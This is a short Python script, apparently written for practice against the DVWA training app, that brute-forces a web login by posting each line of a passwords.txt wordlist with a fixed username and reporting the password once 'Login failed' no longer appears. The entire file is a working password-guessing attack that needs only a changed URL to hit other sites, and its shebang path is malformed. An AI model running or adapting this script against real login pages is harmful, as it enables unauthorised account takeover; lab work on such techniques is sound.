#!/bin/usr/env python3

import requests

target_url = "http://ip/dvwa/login.php"
data = {"username":"hussien","password":"","Login":"submit"}


with open("passwords.txt","r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data["password"] = word
        response = requests.post(target_url,data)
        if "Login failed"  not in response.text:
            print(f"[+]Got the password --> {word}")
            exit()

print("[-]Reached end of line.")

